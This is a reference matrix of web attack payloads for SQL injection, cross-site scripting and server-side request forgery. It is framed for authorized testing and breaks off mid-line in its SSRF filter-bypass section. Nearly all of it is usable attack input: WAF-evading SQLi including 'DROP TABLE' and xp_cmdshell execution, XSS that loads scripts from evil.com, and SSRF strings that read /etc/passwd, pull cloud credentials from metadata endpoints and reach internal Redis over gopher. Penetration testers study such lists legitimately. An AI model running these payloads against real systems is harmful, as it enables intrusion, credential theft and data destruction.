**Authorized security testing only.** Use these payloads exclusively on systems you own or have explicit, written permission to assess. Unauthorized testing may violate laws and organizational policies.

Below is a raw reference matrix organized by vulnerability class, database/context, and common filter-evasion techniques.

---

## 1. SQL Injection (SQLi)

### 1.1 Plain / Classic forms
```text
' OR 1=1 --
' OR '1'='1
" OR 1=1 --
admin' --
' OR 1=1#
' OR 1=1/*
' OR 1=1--
' OR 1=1;--
```

### 1.2 Comment syntax per database
| Database | Inline comment | Block comment | Notes |
|----------|---------------|---------------|-------|
| MySQL | `-- ` (space required) | `/* */` | `#` also works |
| PostgreSQL | `--` | `/* */` | |
| Microsoft SQL Server | `--` | `/* */` | |
| Oracle | `--` | `/* */` | |
| SQLite | `--` | `/* */` | |

**MySQL versioned / conditional comments (often bypass simple WAFs):**
```text
/*!50000SELECT*/
/*!UNION*/
/*!12345AND 1=1*/
/*!00000OR 1=1*/
```

### 1.3 Encoding variants
**URL encoding**
```text
%27%20OR%201%3D1--%20
```

**Double URL encoding**
```text
%2527%2520OR%25201%253D1--%2520
```

**Hex encoding (MySQL)**
```text
0x27204f5220313d31202d2d20
```

**Unicode escape (JSON / JS contexts)**
```text
\u0027 OR \u0031=\u0031
```

### 1.4 Logic / detection variants

**Boolean-based**
```text
' AND 1=1 --
' AND 1=2 --
' AND SUBSTRING(@@version,1,1)=5 --
' AND (SELECT COUNT(*) FROM users)>0 --
```

**Time-based**
```text
-- MySQL / MariaDB
' OR SLEEP(5)--
' OR (SELECT * FROM (SELECT(SLEEP(5)))x)--

-- PostgreSQL
' || pg_sleep(5)--
'; SELECT pg_sleep(5)-- 

-- Microsoft SQL Server
'; WAITFOR DELAY '0:0:5'--

-- Oracle
' OR (SELECT DBMS_PIPE.RECEIVE_MESSAGE('CHECK',5) FROM DUAL) IS NOT NULL--
```

**Union-based**
```text
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,2,3,4,5--
```

**Stacked queries (where supported)**
```text
'; DROP TABLE users--   -- MSSQL / PostgreSQL
'; SELECT * FROM users-- 
```

**Error-based (MySQL example)**
```text
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
```

### 1.5 Database-specific alternate syntax
| DB | Example |
|----|---------|
| MySQL | `SELECT /*!50000 1*/` |
| MSSQL | `; EXEC xp_cmdshell('whoami')` |
| Oracle | `SELECT 1 FROM DUAL` |
| PostgreSQL | `SELECT pg_sleep(5)` |
| SQLite | `'; SELECT sql FROM sqlite_master--` |

---

## 2. Cross-Site Scripting (XSS)

### 2.1 Plain / Classic forms
```text
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
```

### 2.2 By injection context

**HTML body context**
```text
<script>alert(1)</script>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**HTML attribute context**
```text
"><script>alert(1)</script>
' onmouseover=alert(1) '
autofocus onfocus=alert(1)
```

**JavaScript context**
```text
';alert(1);//
</script><script>alert(1)</script>
`;alert(1);//
```

**CSS context**
```text
expression(alert(1))          -- legacy IE
url(javascript:alert(1))
```

**URL context**
```text
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### 2.3 Encoding & obfuscation variants

**HTML entities**
```text
&lt;script&gt;alert(1)&lt;/script&gt;
```

**URL encoding**
```text
%3Cscript%3Ealert(1)%3C/script%3E
```

**Double URL encoding**
```text
%253Cscript%253Ealert%25281%2529%253C%2Fscript%253E
```

**Unicode escape**
```text
\u003cscript\u003ealert(1)\u003c/script\u003e
```

**UTF-7 (legacy, context-dependent)**
```text
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

**Case variation**
```text
<ScRiPt>alert(1)</ScRiPt>
```

**Null byte / extra characters**
```text
<script%00>alert(1)</script>
<script/src=//evil.com/p.js></script>
<script\x3gsrc=//evil.com/p.js>
```

### 2.4 Filter-bypass tags & event handlers
```text
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<math><script>alert(1)</script>
<iframe src=javascript:alert(1)>
<object data=javascript:alert(1)>
<base href=//evil.com/>
<link rel=import href="http://evil.com/x.html">
<form><button formaction=javascript:alert(1)>X</button></form>
<input autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
```

Common event handlers when `script` is blocked:
`onerror`, `onload`, `onmouseover`, `onfocus`, `onblur`, `onwheel`, `ontoggle`, `onanimationstart`, `onauxclick`, `ontouchstart`.

---

## 3. Server-Side Request Forgery (SSRF)

### 3.1 Plain / Internal endpoints
```text
http://127.0.0.1
http://localhost
http://0.0.0.0
http://169.254.169.254/latest/meta-data/
http://10.0.0.1
http://172.16.0.1
http://192.168.1.1
```

### 3.2 IP address obfuscation

**Decimal**
```text
http://2130706433          -- 127.0.0.1
http://3232235777          -- 192.168.1.1
```

**Octal**
```text
http://0177.0.0.1
http://0300.0250.0.1
```

**Hex**
```text
http://0x7f000001          -- 127.0.0.1
http://0xC0A80101          -- 192.168.1.1
```

**IPv6**
```text
http://[::1]
http://[::ffff:127.0.0.1]
http://[::ffff:0:0]/...
```

**Mixed / domain tricks**
```text
http://127.0.0.1.evil.com
http://evil.com@127.0.0.1
http://[127.0.0.1]
http://127.0.0.1:80@evil.com
```

### 3.3 Protocol variants
```text
file:///etc/passwd
file:///c:/windows/win.ini
dict://127.0.0.1:11211/stat
gopher://127.0.0.1:6379/_INFO%0d%0a
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a
ftp://127.0.0.1/
tftp://127.0.0.1:69/
ldap://127.0.0.1:389/
jar://file:///etc/passwd!/
netdoc://...
```

### 3.4 Cloud metadata endpoints
| Provider | Example endpoint |
|----------|------------------|
| AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| AWS | `http://169.254.169.254/latest/user-data/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |
| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` |

*(GCP and Azure often require specific headers such as `Metadata-Flavor: Google` or `Metadata: true`.)*

### 3.5 URL parser / filter bypasses
```text
http://127.0.0.1%23@ev